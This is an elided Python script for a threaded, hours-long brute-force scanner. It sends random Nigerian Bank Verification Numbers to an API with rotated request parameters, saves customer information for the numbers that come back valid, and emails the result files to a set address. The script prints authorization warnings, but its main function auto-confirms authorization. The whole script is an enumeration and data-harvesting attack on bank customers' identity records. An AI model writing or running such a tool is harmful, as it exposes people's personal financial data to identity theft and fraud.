...
class BVNChecker:
    ...
    def update_file_paths(self):
        ...
        self.valid_bvns_file = f"/content/valid_{timestamp}_{self.current_file_index}.txt"
        self.stats_file = f"/content/scan_stats_{timestamp}_{self.current_file_index}.txt"
        
    def rotate_file(self):
        """Rotate to a new file after reaching attempts limit"""
        print(f"\n🔄 Rotating file after {self.attempts_in_current_file} attempts")
        
        # Send current file via email
        if os.path.exists(self.valid_bvns_file) and os.path.getsize(self.valid_bvns_file) > 0:
            print("📧 Sending current file via email...")
        ...
        with self.lock:
            self.valid_count = 0
        print(f"📁 New file created: {self.valid_bvns_file}")
    ...
    def save_valid_bvn(self, bvn_number, response_data):
        ...
        try:
            ...
            with open(self.valid_bvns_file, 'a', encoding='utf-8') as f:
                ...
                f.write(f"📋 Customer Information:\n")
            ...
            print(f"✅ Valid BVN saved to {self.valid_bvns_file}")

        except Exception as e:
            print(f"❌ Error saving BVN data: {e}")
...
"""
    ...
    def check_bvn_single(self, bvn_number, attempt_number):
        ...
        try:
            print(f"[Attempt {attempt_number}] 🔄 Checking BVN: {bvn_number}")
            ...
            if response.status_code == 200:
                ...
                if response_data.get("ResponseCode") == "00":
                    ...
                    print(f"[Attempt {attempt_number}] 🎯 VALID BVN: {bvn_number}")
                    ...
                    with self.lock:
                        ...
                        self.attempts_in_current_file += 1
                    print(f"[Attempt {attempt_number}] ❌ Invalid: {bvn_number}")
                    return False, None
                ...
                with self.lock:
                    self.error_count += 1
                    self.attempts_in_current_file += 1
                print(f"[Attempt {attempt_number}] ⚠️ HTTP {response.status_code}: {bvn_number}")
                return False, None
            ...
            with self.lock:
                self.error_count += 1
                self.attempts_in_current_file += 1
            print(f"[Attempt {attempt_number}] ⏰ Timeout: {bvn_number}")
            return False, None
            ...
            with self.lock:
                self.error_count += 1
                self.attempts_in_current_file += 1
            print(f"[Attempt {attempt_number}] ⚠️ Network error: {e}")
            return False, None
            ...
            with self.lock:
                self.error_count += 1
                self.attempts_in_current_file += 1
            print(f"[Attempt {attempt_number}] ⚠️ Error: {e}")
            return False, None

    def threaded_bvn_scan(self, num_attempts=3000, max_threads=50):
        """Fast threaded BVN scanning with parameter rotation"""
        print(f"\n🚀 Starting threaded BVN scan with {num_attempts} attempts")
        print("=" * 60)
        print("⚠️  WARNING: This is aggressive scanning!")
        print("⚠️  Only use with proper authorization!")
        print("🔄 Using parameter rotation for each request")
        print("=" * 60)
        ...
        while self.is_scanning and datetime.now() < self.scan_end_time:
            ...
            def worker(attempt_number):
                ...
                if attempt_number % 10 == 0:
                    ...
                    print(f"📊 Progress: {total_attempts_completed + attempt_number}/{num_attempts} | Valid: {current_valid}/{current_total}")
                    print(f"📁 Current File: {os.path.basename(self.valid_bvns_file)} | Attempts: {self.attempts_in_current_file}")
...
def main():
    ...
    print("✅ Authorization confirmed (auto-proceed)")
    ...
    print(f"\n🔍 Mode: Continuous Random BVN scanning")
    print(f"⏰ Duration: {checker.scan_duration_hours} hours")
    print(f"📁 File Rotation: Every {checker.attempts_per_file} attempts")
    print(f"⚡ Threads: {concurrent_threads}")
    print(f"⏱️  Stagger Delay: 0.5 seconds (same as working script)")

    print("\n🚀 Starting continuous scan in 1 second...")
    time.sleep(1)
    ...
    try:
        ...
        print("="*80)
        print(f"✅ Total valid BVNs found: {checker.valid_count}")
        ...
        print(f"\n📧 All files have been emailed to: {checker.recipient_email}")
